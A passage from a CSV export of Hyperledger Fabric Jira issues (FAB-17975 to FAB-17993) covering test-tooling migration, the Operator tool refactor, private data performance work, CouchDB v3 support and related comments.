 ",,btl5037,Matrixik,,,,,,,,,,,,,,,,,,,,FAB-18000,FAB-18001,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,PTEgo,To Do,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz2k",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,Matrixik,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Migrate Node PTE to Interoperability,FAB-17975,45236,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,btl5037,btl5037,10/Jun/20 11:52 AM,11/Jan/21 3:13 AM,28/Oct/23 3:10 AM,11/Jan/21 3:13 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Today the Node-based PTE acts as our driver for all tests. Now that we have a Go-based PTE we should migrate PTE to an Interop test suite and consume the Go PTE as our defacto test driver.

This story will encapsulate all of the interop test scenarios, as well as the steps to migrating away from Node-PTE being a performance tool, and instead being a suite of test for confirming support for the Node SDK across the chaincodes, fabric and fabric-ca.

Acceptance criteria: A nightly tests performs full interop testing across the entire fabric ecosystem, driven by the Node SDK.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0191g:zi",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Use Fabric-Config in Place of Configtxgen,FAB-17976,45237,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,btl5037,btl5037,10/Jun/20 11:54 AM,11/Jan/21 1:34 AM,28/Oct/23 3:10 AM,11/Jan/21 1:34 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"We should modify the Operator tooling to use the new Fabric-Config library to perform config operations in place of calling out to the configtxgen CLI directly. This will allow us to cut yet another outside CLI dependency, and properly version our tooling.

Acceptance criteria: I can run E2E system tests without needing to put configtxgen on my path beforehand.

Example usage: [https://github.com/stephyee/fabric/blob/fab-17785-demo-cli/cmd/configtxdemo/main.go#L448-L523]

GoDoc: [https://godoc.org/github.com/hyperledger/fabric-config/configtx]

 ",,btl5037,Matrixik,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0191g:k",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,Matrixik,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create Test Scenarios for the External Chaincode Launcher,FAB-17977,45238,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,btl5037,btl5037,10/Jun/20 11:59 AM,11/Jan/21 3:16 AM,28/Oct/23 3:10 AM,11/Jan/21 3:16 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"The external chaincode launcher was added as part of the v2.0.0 release. This change allows users to break free of the dependency on the docker daemon inside the peer.

In particular users can launch chaincode as standalone servers, they can launch docker containers out of band running chaincode and connect to them, or they can launch separate kubernetes pods running the chaincode.

This story will encapsulate two test scenarios:
 * Launching the chaincode in Docker out of band and connecting to it
 * Launching the chaincode as a separate pod and connecting to it

Acceptance criteria: A daily test is run testing the functionality of the external launchers in docker and kubernetes ",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0191h:c",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update Test Scenarios to Use v2.0 Application Capabilities,FAB-17978,45239,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,btl5037,btl5037,10/Jun/20 12:03 PM,11/Jan/21 1:33 AM,28/Oct/23 3:10 AM,11/Jan/21 1:33 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Until recently we did not have the tooling in place to launch networks using the 2.0 capabilities due to a lack of support in the SDK's for the 2.0 lifecycle.

Now that the tooling exists we should upgrade all test scenarios to use the 2.0 application capabilities.

Acceptance criteria: All tests use 2.0 application capabilities.",,btl5037,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz1r",,,,Unset,Unset,In Progress,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,suryalnvs,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,release-2.2,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,mergify/bp/release-2.2/pr-275,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Jun/20 2:21 AM;btl5037;Install and Instantiate parameters need to be updated to the 2.0 Application paramaters as well in the test input file;;;","12/Jun/20 2:28 AM;btl5037;We also need to verify that every test scenario still works;;;","27/Jun/20 12:11 AM;suryalnvs;https://github.com/hyperledger/fabric-test/pull/212;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enhance Operator to Support the Addition of Network Components,FAB-17979,45240,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,10/Jun/20 12:07 PM,11/Jan/21 1:33 AM,28/Oct/23 3:10 AM,11/Jan/21 1:33 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"The operator tooling exists as a static configuration tool today. In an effort to support additional test scenarios, it should be modified to include the capability of adding additional component to the network. In particular we should be able to add CA's, Peer's and Orderer's.

This story will break out the addition of each component.

Acceptance criteria: I can add a component to an existing, running network.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0191h:i",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Use a Dedicated Kubernetes Cluster for Barebone Regression Tests,FAB-17980,45241,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,btl5037,btl5037,10/Jun/20 12:09 PM,11/Jan/21 1:33 AM,28/Oct/23 3:10 AM,11/Jan/21 1:33 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"To achieve more consistent results on the barebones test scenarios, the tests should be migrated from docker, to kubernetes running on dedicated VM's.

Set KUBE_CONFIG to execute on Kubernetes

go run main.go -k $KUBE_CONFIG

Use ibmcloud CLI to login to the cluster and get the kubeconfig

The client will also need to be on a dedicated VM. They exist in the `Fabric System Test` pool.

We need to clean up the directory at the end of the test.

Acceptance criteria: Performance tests are executed on kubernetes.",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0191g:x",,,,Unset,Unset,To Do,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Refactor Operator Tool,FAB-17981,45248,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,btl5037,btl5037,btl5037,12/Jun/20 12:18 AM,11/Jan/21 3:18 AM,28/Oct/23 3:10 AM,11/Jan/21 3:18 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,1,,,,,,"The first thing I'll note is, this is going into a feature branch, not directly into master, as getting it right is more important to me than getting it in. I am opening the PR's here so the work is visible and can be commented on, but it will not change the way the Operator works today, as I wont be merging anything to master until all of the work is done.

The second thing is, I am focusing on one part at a time (Docker to start). This means I am okay breaking things related to kuberenetes up front. Once I am done with the Docker portion, I will come back through each PR and refactor each PR to work with Kubernetes. So the NodePortIP missing would be corrected in a refactor of this PR at a later time

Today the operator calls out to several command line tools: Docker, Configtxgen, Configtxlator, YTT, Crtyptogen, and even performing some tasks like moving a file by calling the bash {{mv}} as opposed to using the Go {{os.Rename}}, and until recently when Surya added support for the KubeSDK we also called out to the {{kubectl}} command.

This is highly problematic in that it requires the user to first put tools on their path before ever using our tool. It also prevents us from ensuring version compatibility, i.e., I don't know if they have configtxgen 2.0 or 1.1.

Because of YTT we also write a custom config to disk, over and over again. And we read the config and append data to it and write it to disk, then read it again, and append data to it and write it to disk, all before ever generating the YAML files we want.

Instead these changes will bring about proper config injection and dependency management. Creating in memory config objects where necessary and replacing tools like configtxgen and configtxlator with the {{fabric-config}} to manage config operations in code, and replace the calls to Docker with the Docker SDK, and ultimately remove YTT by replacing cryptogen with calls to the fabric CA using the Go SDK (since we aren't actually testing the functionality of cryptogen the place we get crypto from is irrelevant).

Ultimately this will allow us to remove external dependencies, and make the Operator tool a truly standalone tool.

All of this is in support of an upcoming proposal to convert PTE from Node.js to the Go SDK, now that it supports the high-level programming model and is receiving first-class support now. The change tot he Go SDK will allow us to embed everything we need to perform System Tests in the Operator tooling. Getting the Operator into state where it is able to extended and maintained is important, and today it is very hard to wrap you head around what is happening as a lot of things are managed on disk, rather than in code.",,btl5037,Matrixik,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwz1i",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,Matrixik,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Integration test for list (all) channels and list (single) channel, with system channel",FAB-17982,45249,45221,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,12/Jun/20 12:38 AM,20/Jun/20 4:12 AM,28/Oct/23 3:10 AM,20/Jun/20 4:12 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"Test list, list all, of network with system channel, w solo, kafka & raft. 
On raft: with multiple orderers & multiple channels, not all orderers on all channels, in order to check the etcdraft.Chain ""member""+""active"" and the inactive.Chain with ""config-tracker""+""inactive"".",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cyz:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Jun/20 1:54 AM;wlahti;[https://github.com/hyperledger/fabric/pull/1391];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add CLI support for PEM bytes for certificates in connection profile,FAB-17983,45250,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,wlahti,wlahti,12/Jun/20 4:14 AM,16/Mar/21 5:08 AM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-cli,,,,,,,,,0,,,,,,,,Cherep,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17513,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01cz7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Cherep,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Performance Improvements to Private Data Collections,FAB-17984,45253,,Story,In Progress,FAB,Fabric,software,denyeart,,,Medium,,Senthil1,Senthil1,Senthil1,14/Jun/20 3:34 PM,20/Apr/21 11:05 PM,28/Oct/23 3:10 AM,,,,,,,,,,,v2.3.0,,,,fabric-gossip,fabric-ledger,,,,,,,,0,,,,,,,,denyeart,dtomczyk,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqxobr",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,dtomczyk,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Jun/20 10:59 PM;denyeart;Only subtask FAB-17986 is for v2.2. I've tagged the story for v2.3.0 otherwise.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Registrar newChain should not copy chains map,FAB-17985,45254,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,14/Jun/20 11:17 PM,15/Jun/20 10:14 PM,28/Oct/23 3:10 AM,15/Jun/20 10:14 PM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,"Currently the Registrar.newChains() copies the chains map to a new one, supposedly to allow concurrent reads on the map while a chain is created. This is redundant because the newChain takes rwmutex.Lock(), which blocks reads.

It is enough to just create the chain and insert it to the map.
",,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d03:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Purge transient store entries in the background,FAB-17986,45255,45253,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,Senthil1,Senthil1,15/Jun/20 1:58 PM,25/Jun/20 10:58 PM,28/Oct/23 3:10 AM,18/Jun/20 11:02 AM,,,,,,,,,,v2.2.0,,,,fabric-gossip,,,,,,,,,0,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d0b:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Commit to the block store and private data store in parallel,FAB-17987,45256,45253,Sub-task,In Progress,FAB,Fabric,software,denyeart,,,Medium,,,Senthil1,Senthil1,15/Jun/20 1:58 PM,09/May/23 6:47 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/20 1:58 PM;Senthil1;image-2020-06-15-10-28-16-595.png;https://jira.hyperledger.org/secure/attachment/18351/image-2020-06-15-10-28-16-595.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d0j:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Commit to private data purge DB and state DB in parallel,FAB-17988,45257,45253,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,,Senthil1,Senthil1,15/Jun/20 1:58 PM,15/Jun/20 1:58 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/20 1:58 PM;Senthil1;image-2020-06-15-10-28-32-093.png;https://jira.hyperledger.org/secure/attachment/18353/image-2020-06-15-10-28-32-093.png","15/Jun/20 1:58 PM;Senthil1;image-2020-06-15-10-28-33-066.png;https://jira.hyperledger.org/secure/attachment/18352/image-2020-06-15-10-28-33-066.png",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d0r:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cache at the transient store ,FAB-17989,45258,45253,Sub-task,To Do,FAB,Fabric,software,denyeart,,,Medium,,,Senthil1,Senthil1,15/Jun/20 1:59 PM,15/Jun/20 1:59 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-gossip,fabric-ledger,,,,,,,,0,,,,,,,,Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01d0z:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Senthil1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
when open  link for FAB-15474. I can't get the issue. why?,FAB-17990,45260,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid: Works as Expected,,haolipeng,haolipeng,15/Jun/20 4:45 PM,18/Jun/20 12:54 AM,28/Oct/23 3:10 AM,18/Jun/20 12:48 AM,v1.4.6,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,Documentation,,,,,"when open  link  https://jira.hyperledger.org/browse/FAB-15474. I can't get the issue.

why? 

!image-2020-06-15-15-42-56-608.png|width=514,height=170!

 

 

 ",,denyeart,haolipeng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Jun/20 4:42 PM;haolipeng;image-2020-06-15-15-42-56-608.png;https://jira.hyperledger.org/secure/attachment/18354/image-2020-06-15-15-42-56-608.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,https://github.com/hyperledger/fabric/commit/98f61f7,Unset,No,,,"1|i01d1f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,haolipeng,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"18/Jun/20 12:48 AM;denyeart;That Jira is not open for public viewing, but you can see the related commit here: https://github.com/hyperledger/fabric/commit/98f61f7
You can ping on rocket chat dave.enyeart for more info.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document comparison of the advantages of using private data collections over increasing the number of channels.,FAB-17991,45262,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,pandrejko,pandrejko,15/Jun/20 9:22 PM,13/Jan/21 7:46 AM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,See this nice summary from Senthil https://lists.hyperledger.org/g/fabric/message/8508?reply=1,,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrhk:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add Remove API to block storage provider to remove ledger data for a channel,FAB-17992,45265,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,wenjian,wenjian,15/Jun/20 11:10 PM,02/Jul/20 11:49 PM,28/Oct/23 3:10 AM,02/Jul/20 11:45 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,,,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-15712,,,,,,,,,,FAB-17802,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17712,,,No,,Unset,No,,,"1|i01d23:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jun/20 12:49 AM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1423];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add support for CouchDB v3.x,FAB-17993,45267,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,denyeart,denyeart,16/Jun/20 1:15 AM,27/Jun/20 12:22 AM,28/Oct/23 3:10 AM,27/Jun/20 12:22 AM,,,,,,,,,,v2.2.0,,,,fabric-ledger,fabric-quality,,,,,,,,0,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18005,,,FAB-18006,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqw",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jun/20 3:33 AM;denyeart;[~btl5037] 